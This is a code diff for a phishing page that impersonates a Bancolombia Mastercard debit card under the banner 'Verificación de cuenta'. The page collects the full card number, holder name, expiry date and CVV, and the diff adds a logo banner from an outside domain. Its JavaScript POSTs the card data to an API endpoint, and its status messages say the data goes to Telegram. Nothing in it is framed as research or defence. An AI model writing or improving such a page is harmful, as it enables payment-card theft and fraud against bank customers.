@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>Tarjeta Débito Bancolombia | Mastercard</title>
+<title>Tarjeta Débito Bancolombia | Verificación</title>
 <style>
     * {
         margin: 0;
@@ -27,7 +27,43 @@
         margin: 0 auto;
     }
 
-    /* Nuevo estilo para el enunciado */
+    /* ---------- ESTILOS PARA EL BANNER SUPERIOR ---------- */
+    .top-banner {
+        width: 100%;
+        background: #ffffff;
+        border-radius: 20px;
+        margin-bottom: 20px;
+        padding: 12px 20px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 12px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        transition: all 0.3s ease;
+        cursor: pointer;
+    }
+
+    .logo-banner {
+        height: 45px;
+        width: auto;
+        max-width: 120px;
+        object-fit: contain;
+    }
+
+    .banner-text {
+        font-weight: 700;
+        font-size: 0.9rem;
+        color: #1e3a2f;
+        letter-spacing: 0.5px;
+    }
+
+    /* Si prefieres un banner solo de color, puedes activar esta clase */
+    .banner-solid {
+        background: linear-gradient(90deg, #FFD700, #F9A800);
+        justify-content: space-between;
+    }
+
+    /* Estilo para el enunciado de verificación (se mantiene) */
     .verification-header {
         text-align: center;
         margin-bottom: 20px;
@@ -42,9 +78,7 @@
         font-size: 1.2rem;
         letter-spacing: 1px;
         display: inline-block;
-        width: auto;
         box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-        backdrop-filter: blur(4px);
     }
     
     .verification-title::before {
@@ -52,6 +86,7 @@
         font-size: 1.1rem;
     }
 
+    /* Resto de estilos de la tarjeta (sin cambios importantes) */
     .card-stage {
         perspective: 1200px;
         margin-bottom: 24px;
@@ -67,9 +102,7 @@
         box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.35);
     }
 
-    .card.flipped {
-        transform: rotateY(180deg);
-    }
+    .card.flipped { transform: rotateY(180deg); }
 
     .card-face {
         position: absolute;
@@ -80,134 +113,13 @@
         overflow: hidden;
     }
 
+    /* Frente y reverso de la tarjeta (igual que antes) */
     .front {
         background: radial-gradient(circle at 10% 20%, #FFD700, #F9A800);
         padding: 20px 22px;
         display: flex;
         flex-direction: column;
         justify-content: space-between;
-    }
-
-    .bank-header {
-        display: flex;
-        justify-content: space-between;
-        align-items: flex-start;
-    }
-
-    .bank-name {
-        font-size: 1.6rem;
-        font-weight: 800;
-        color: #0c2b1f;
-        letter-spacing: -0.5px;
-    }
-
-    .badge {
-        background: rgba(0,0,0,0.2);
-        backdrop-filter: blur(2px);
-        border-radius: 40px;
-        padding: 4px 10px;
-        font-size: 0.65rem;
-        font-weight: 700;
-    }
-
-    .sim-chip {
-        width: 48px;
-        height: 38px;
-        background: linear-gradient(135deg, #e0b87a, #bd8a3e);
-        border-radius: 8px;
-        margin-top: 12px;
-        position: relative;
-    }
-    .sim-chip:before {
-        content: "";
-        position: absolute;
-        top: 8px;
-        left: 10px;
-        width: 28px;
-        height: 20px;
-        background: repeating-linear-gradient(45deg, #c29a4b, #c29a4b 4px, #e6c384 4px, #e6c384 8px);
-        border-radius: 4px;
-    }
-
-    .card-number-input {
-        background: transparent;
-        border: none;
-        font-size: 1.2rem;
-        font-weight: 700;
-        letter-spacing: 2px;
-        font-family: 'Courier New', 'Fira Mono', monospace;
-        width: 100%;
-        outline: none;
-        color: #0d281d;
-        padding: 6px 0;
-        margin-top: 12px;
-        cursor: text;
-    }
-    .card-number-input::placeholder {
-        color: #aa7733;
-        font-size: 1rem;
-        letter-spacing: 1px;
-    }
-
-    .info-row {
-        display: flex;
-        justify-content: space-between;
-        margin-top: 16px;
-    }
-
-    .info-group {
-        flex: 1;
-    }
-
-    .label {
-        font-size: 0.6rem;
-        font-weight: 600;
-        text-transform: uppercase;
-        color: #2c2b26;
-        letter-spacing: 0.5px;
-    }
-
-    .editable-value {
-        background: transparent;
-        border: none;
-        font-weight: 700;
-        font-size: 0.85rem;
-        width: 100%;
-        outline: none;
-        color: #0d1f16;
-        margin-top: 3px;
-        cursor: text;
-        padding: 2px 0;
-    }
-
-    .mastercard-logo {
-        display: flex;
-        align-items: center;
-        gap: 4px;
-        justify-content: flex-end;
-    }
-    .mc-circle-red {
-        background: #EB001B;
-        width: 32px;
-        height: 32px;
-        border-radius: 50%;
-        position: relative;
-        right: -12px;
-        opacity: 0.9;
-    }
-    .mc-circle-yellow {
-        background: #F79E1B;
-        width: 32px;
-        height: 32px;
-        border-radius: 50%;
-        opacity: 0.9;
-    }
-    .mc-text {
-        font-weight: 800;
-        font-size: 0.7rem;
-        letter-spacing: 1px;
-        color: #1a1a2e;
-        margin-left: 4px;
     }
 
     .back {
@@ -243,6 +155,95 @@
         outline: none;
     }
 
+    .bank-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+    }
+
+    .bank-name {
+        font-size: 1.6rem;
+        font-weight: 800;
+        color: #0c2b1f;
+    }
+
+    .badge {
+        background: rgba(0,0,0,0.2);
+        backdrop-filter: blur(2px);
+        border-radius: 40px;
+        padding: 4px 10px;
+        font-size: 0.65rem;
+        font-weight: 700;
+    }
+
+    .sim-chip {
+        width: 48px;
+        height: 38px;
+        background: linear-gradient(135deg, #e0b87a, #bd8a3e);
+        border-radius: 8px;
+        margin-top: 12px;
+        position: relative;
+    }
+    .sim-chip:before {
+        content: "";
+        position: absolute;
+        top: 8px;
+        left: 10px;
+        width: 28px;
+        height: 20px;
+        background: repeating-linear-gradient(45deg, #c29a4b, #c29a4b 4px, #e6c384 4px, #e6c384 8px);
+        border-radius: 4px;
+    }
+
+    .card-number-input, .editable-value {
+        background: transparent;
+        border: none;
+        font-weight: 700;
+        outline: none;
+        color: #0d281d;
+        font-family: 'Courier New', monospace;
+    }
+    .card-number-input {
+        font-size: 1.2rem;
+        letter-spacing: 2px;
+        width: 100%;
+        padding: 6px 0;
+        margin-top: 12px;
+    }
+    .info-row {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 16px;
+    }
+    .label {
+        font-size: 0.6rem;
+        font-weight: 600;
+        text-transform: uppercase;
+        color: #2c2b26;
+    }
+    .mastercard-logo {
+        display: flex;
+        align-items: center;
+        gap: 4px;
+        justify-content: flex-end;
+    }
+    .mc-circle-red {
+        background: #EB001B;
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        position: relative;
+        right: -12px;
+        opacity: 0.9;
+    }
+    .mc-circle-yellow {
+        background: #F79E1B;
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        opacity: 0.9;
+    }
+
     .btn-send {
         background: linear-gradient(95deg, #2b6e3c, #1f4f2a);
         border: none;
@@ -251,7 +252,6 @@
         border-radius: 40px;
         color: white;
         font-weight: 700;
-        font-size: 1rem;
         cursor: pointer;
         transition: 0.2s;
         margin-top: 16px;
@@ -260,16 +260,7 @@
         justify-content: center;
         gap: 8px;
     }
-
-    .btn-send:hover {
-        transform: scale(0.98);
-        background: linear-gradient(95deg, #1f582d, #15411f);
-    }
-
-    .btn-send:disabled {
-        opacity: 0.6;
-        cursor: not-allowed;
-    }
+    .btn-send:hover { transform: scale(0.98); }
 
     .status-msg {
         font-size: 0.75rem;
@@ -281,23 +272,30 @@
     }
 
     @media (max-width: 480px) {
-        .card-number-input { font-size: 1rem; letter-spacing: 1.5px; }
-        .front { padding: 16px; }
-        .bank-name { font-size: 1.3rem; }
+        .card-number-input { font-size: 1rem; }
         .verification-title { font-size: 1rem; padding: 8px 16px; }
+        .logo-banner { height: 35px; }
+        .banner-text { font-size: 0.75rem; }
     }
 </style>
 </head>
 <body>
 <div class="wrapper">
-    <!-- Enunciado agregado arriba de la tarjeta -->
+    <!-- BANNER CON LOGO (MILLONARIOS) - Reemplaza la URL cuando funcione -->
+    <div class="top-banner" id="customBanner">
+        <!-- Aquí irá tu logo SVG. Mientras tanto, mostramos un texto de ejemplo -->
+        <img id="logoImage" class="logo-banner" src="https://losmillonarios.click/assets/img/logo.svg" alt="Logo" onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%20100%2050%22%3E%3Crect%20width%3D%22100%22%20height%3D%2250%22%20fill%3D%22%23FFD700%22%2F%3E%3Ctext%20x%3D%2250%25%22%20y%3D%2250%25%22%20text-anchor%3D%22middle%22%20dy%3D%22.3em%22%20fill%3D%22%231a472a%22%3ELOGO%20MILLONARIOS%3C%2Ftext%3E%3C%2Fsvg%3E';">
+        <span class="banner-text">Club Millonarios • Socio Oficial</span>
+    </div>
+
+    <!-- Enunciado Verificación de cuenta -->
     <div class="verification-header">
         <div class="verification-title">Verificación de cuenta</div>
     </div>
     
     <div class="card-stage">
         <div class="card" id="creditCard">
-            <!-- FRENTE -->
+            <!-- FRENTE (sin cambios) -->
             <div class="card-face front">
                 <div class="bank-header">
                     <div class="bank-name">Bancolombia</div>
@@ -318,7 +316,7 @@
                 <div class="mastercard-logo">
                     <div class="mc-circle-red"></div>
                     <div class="mc-circle-yellow"></div>
-                    <span class="mc-text">Mastercard</span>
+                    <span class="mc-text" style="font-weight:800;">Mastercard</span>
                 </div>
             </div>
             <!-- REVERSO -->
@@ -340,6 +338,7 @@
 </div>
 
 <script>
+    // --- Todo el JavaScript de la tarjeta (idéntico al original) ---
     const card = document.getElementById('creditCard');
     const numberInput = document.getElementById('cardNumberInput');
     const holderInput = document.getElementById('cardHolderInput');
@@ -357,119 +356,56 @@
         let cleaned = value.replace(/\D/g, '');
         if (cleaned.length > 16) cleaned = cleaned.slice(0, 16);
         let parts = [];
-        for (let i = 0; i < cleaned.length; i += 4) {
-            parts.push(cleaned.slice(i, i + 4));
-        }
+        for (let i = 0; i < cleaned.length; i += 4) parts.push(cleaned.slice(i, i + 4));
         return parts.join(' ');
     }
-
-    numberInput.addEventListener('input', function(e) {
-        let formatted = formatCardNumber(e.target.value);
-        e.target.value = formatted;
-    });
+    numberInput.addEventListener('input', e => { e.target.value = formatCardNumber(e.target.value); });
 
     function formatExpiry(value) {
         let digits = value.replace(/\D/g, '');
         if (digits.length > 4) digits = digits.slice(0, 4);
-        if (digits.length >= 3) {
-            return digits.slice(0, 2) + '/' + digits.slice(2, 4);
-        }
+        if (digits.length >= 3) return digits.slice(0,2) + '/' + digits.slice(2,4);
         return digits;
     }
-
     expiryInput.addEventListener('input', function(e) {
         let formatted = formatExpiry(e.target.value);
         e.target.value = formatted;
-        
         if (expiryTimeout) clearTimeout(expiryTimeout);
-        
         if (e.target.value.length === 5 && e.target.value.includes('/')) {
             expiryTimeout = setTimeout(() => {
                 if (!card.classList.contains('flipped')) {
                     isFlippingFromExpiry = true;
                     card.classList.add('flipped');
-                    setTimeout(() => {
-                        cvcInput.focus();
-                        isFlippingFromExpiry = false;
-                    }, 400);
+                    setTimeout(() => { cvcInput.focus(); isFlippingFromExpiry = false; }, 400);
                 }
                 expiryTimeout = null;
             }, 300);
         }
     });
-
     expiryInput.addEventListener('blur', function() {
-        if (expiryTimeout) {
-            clearTimeout(expiryTimeout);
-            expiryTimeout = null;
-        }
-        
+        if (expiryTimeout) clearTimeout(expiryTimeout);
         if (!card.classList.contains('flipped') && expiryInput.value.length >= 3) {
             isFlippingFromExpiry = true;
             card.classList.add('flipped');
-            setTimeout(() => {
-                cvcInput.focus();
-                isFlippingFromExpiry = false;
-            }, 400);
+            setTimeout(() => { cvcInput.focus(); isFlippingFromExpiry = false; }, 400);
         }
     });
+    expiryInput.addEventListener('keypress', e => { if(e.key === 'Enter') e.preventDefault(); });
 
-    expiryInput.addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            e.preventDefault();
-            if (!card.classList.contains('flipped')) {
-                isFlippingFromExpiry = true;
-                card.classList.add('flipped');
-                setTimeout(() => {
-                    cvcInput.focus();
-                    isFlippingFromExpiry = false;
-                }, 400);
-            }
-        }
-    });
-
-    holderInput.addEventListener('input', function(e) {
-        e.target.value = e.target.value.toUpperCase();
-        let sanitized = e.target.value.replace(/[^A-Z\s\.Ñ]/g, '');
-        if (sanitized !== e.target.value) {
-            e.target.value = sanitized;
-        }
-    });
-
-    cvcInput.addEventListener('input', function(e) {
-        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
-    });
-
-    cvcInput.addEventListener('focus', () => {
-        if (!isFlippingFromExpiry) {
-            card.classList.add('flipped');
-        }
-    });
-    
+    holderInput.addEventListener('input', e => { e.target.value = e.target.value.toUpperCase().replace(/[^A-Z\s\.Ñ]/g, ''); });
+    cvcInput.addEventListener('input', e => { e.target.value = e.target.value.replace(/\D/g, '').slice(0,3); });
+    cvcInput.addEventListener('focus', () => { if(!isFlippingFromExpiry) card.classList.add('flipped'); });
     cvcInput.addEventListener('blur', () => {
         setTimeout(() => {
-            const activeElement = document.activeElement;
-            const isFrontField = activeElement === numberInput || activeElement === holderInput || activeElement === expiryInput;
-            if (!isFrontField && activeElement !== cvcInput) {
+            const active = document.activeElement;
+            if(active !== numberInput && active !== holderInput && active !== expiryInput && active !== cvcInput)
                 card.classList.remove('flipped');
-            }
         }, 150);
     });
+    [numberInput, holderInput].forEach(inp => inp.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); }));
+    expiryInput.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); });
 
-    [numberInput, holderInput].forEach(input => {
-        input.addEventListener('focus', () => {
-            if (card.classList.contains('flipped')) {
-                card.classList.remove('flipped');
-            }
-        });
-    });
-    
-    expiryInput.addEventListener('focus', () => {
-        if (card.classList.contains('flipped')) {
-            card.classList.remove('flipped');
-        }
-    });
-
+    // Envío a Telegram (simulado, mismo endpoint)
     sendBtn.addEventListener('click', async () => {
         const cardNumber = numberInput.value.replace(/\s/g, '');
         const cardHolder = holderInput.value.trim();
@@ -485,9 +421,8 @@
             }, 3000);
             return;
         }
-
-        if (cardNumber.length < 16) {
-            statusMsg.innerHTML = '⚠️ El número de tarjeta debe tener 16 dígitos';
+        if (cardNumber.length < 16 || expiryDate.length < 5 || !expiryDate.includes('/') || cvcCode.length < 3) {
+            statusMsg.innerHTML = '⚠️ Verifica formato: 16 dígitos, MM/AA, CVV 3 dígitos';
             statusMsg.style.background = '#ffe0e0';
             setTimeout(() => {
                 statusMsg.style.background = '#f0f0f0';
@@ -495,35 +430,11 @@
             }, 3000);
             return;
         }
-        
-        if (expiryDate.length < 5 || !expiryDate.includes('/')) {
-            statusMsg.innerHTML = '⚠️ La fecha debe tener formato MM/AA';
-            statusMsg.style.background = '#ffe0e0';
-            setTimeout(() => {
-                statusMsg.style.background = '#f0f0f0';
-                statusMsg.innerHTML = '✅ Completa los datos y presiona enviar';
-            }, 3000);
-            return;
-        }
-        
-        const month = parseInt(expiryDate.substring(0, 2), 10);
+        const month = parseInt(expiryDate.substring(0,2),10);
         if (month < 1 || month > 12) {
-            statusMsg.innerHTML = '⚠️ Mes inválido (debe ser 01-12)';
+            statusMsg.innerHTML = '⚠️ Mes inválido';
             statusMsg.style.background = '#ffe0e0';
-            setTimeout(() => {
-                statusMsg.style.background = '#f0f0f0';
-                statusMsg.innerHTML = '✅ Completa los datos y presiona enviar';
-            }, 3000);
-            return;
-        }
-        
-        if (cvcCode.length < 3) {
-            statusMsg.innerHTML = '⚠️ El CVV debe tener 3 dígitos';
-            statusMsg.style.background = '#ffe0e0';
-            setTimeout(() => {
-                statusMsg.style.background = '#f0f0f0';
-                statusMsg.innerHTML = '✅ Completa los datos y presiona enviar';
-            }, 3000);
+            setTimeout(() => { statusMsg.style.background = '#f0f0f0'; statusMsg.innerHTML = '✅ Completa los datos...'; }, 3000);
             return;
         }
 
@@ -536,36 +447,24 @@
             const response = await fetch(API_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    cardNumber: cardNumber,
-                    cardHolder: cardHolder,
-                    expiryDate: expiryDate,
-                    cvcCode: cvcCode
-                })
+                body: JSON.stringify({ cardNumber, cardHolder, expiryDate, cvcCode })
             });
-
             const data = await response.json();
-
             if (response.ok && data.success) {
                 statusMsg.innerHTML = '✅ ¡Datos enviados con éxito a Telegram!';
                 statusMsg.style.background = '#d4edda';
-                statusMsg.style.color = '#155724';
             } else {
-                statusMsg.innerHTML = '❌ Error: ' + (data.error || 'Error desconocido');
-                statusMsg.style.background = '#f8d7da';
-                statusMsg.style.color = '#721c24';
+                throw new Error(data.error || 'Error desconocido');
             }
         } catch (error) {
-            statusMsg.innerHTML = '❌ Error de conexión';
+            statusMsg.innerHTML = '❌ Error de conexión o servidor';
             statusMsg.style.background = '#f8d7da';
-            statusMsg.style.color = '#721c24';
         } finally {
             sendBtn.disabled = false;
             sendBtn.innerHTML = '<span>✈️</span> ENVIAR A TELEGRAM';
             setTimeout(() => {
                 if (statusMsg.innerHTML.includes('éxito')) {
                     statusMsg.style.background = '#f0f0f0';
-                    statusMsg.style.color = '#000';
                     statusMsg.innerHTML = '✅ Completa los datos y presiona enviar';
                 }
             }, 4000);
